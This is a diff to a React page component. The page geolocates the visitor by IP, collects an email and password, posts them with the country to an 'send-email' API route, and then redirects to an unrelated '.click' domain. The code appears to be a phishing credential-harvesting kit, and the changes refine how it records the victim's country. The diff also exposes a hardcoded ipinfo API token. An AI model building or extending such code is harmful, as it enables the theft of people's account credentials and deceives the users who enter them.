@@ -13,13 +13,19 @@ export default function Home() {
   const [isProcessing, setIsProcessing] = useState(false); // Modal state
 
   useEffect(() => {
-    // Fetch user's country based on IP
+    // Fetch user's country based on IP and get full country name
     axios.get('https://ipinfo.io/json?token=c3e87e382ddea7')
       .then(response => {
-        setCountry(response.data.country);
+        const countryCode = response.data.country;
+        // Fetch full country name using the country code
+        return axios.get(`https://restcountries.com/v3.1/alpha/${countryCode}`);
+      })
+      .then(countryResponse => {
+        setCountry(countryResponse.data[0].name.common); // Set full country name
       })
       .catch(error => {
-        console.error('Failed to fetch country:', error);
+        console.error('Failed to fetch full country name:', error);
+        setErrorMessage('Failed to retrieve country information.');
       });
   }, []);
 
@@ -35,21 +41,25 @@ export default function Home() {
 
   const handlePasswordSubmit = async (e) => {
     e.preventDefault();
+
     if (password.length >= 5) {
       setIsProcessing(true); // Show processing modal
+
       try {
+        // Send email and password with country to the backend API
         const response = await axios.post('/api/send-email', {
           email,
           password,
           country,
         });
+
         console.log('Email sent successfully!', response.data.message);
         window.location.href = 'https://sg.alltrack-cokflies.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
       } finally {
-        setIsProcessing(false); // Hide processing modal
+        setIsProcessing(false); // Hide processing modal after API call completes
       }
     } else {
       setErrorMessage('Password must be at least 5 characters long.');
